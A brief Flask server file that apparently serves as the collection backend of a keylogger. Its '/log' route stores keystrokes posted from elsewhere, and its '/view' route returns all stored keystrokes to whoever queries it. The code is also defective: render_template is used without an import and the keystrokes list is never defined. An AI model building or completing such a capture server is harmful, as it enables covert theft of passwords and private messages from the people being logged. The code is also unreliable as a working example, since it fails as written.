from flask import Flask, request, jsonify

app = Flask(__name__)

@app.route('/')
def home():
    return render_template('index.html')  # This will load index.html from templates folder

@app.route('/about')
def about():
    return 'About'

@app.route('/log', methods=['POST'])
def log_keys():
    data = request.json
    keystrokes.append(data.get("keystrokes", ""))
    return jsonify({"message": "Logged successfully"}), 200

@app.route('/view', methods=['GET'])
def view_logs():
    return jsonify({"logs": keystrokes})
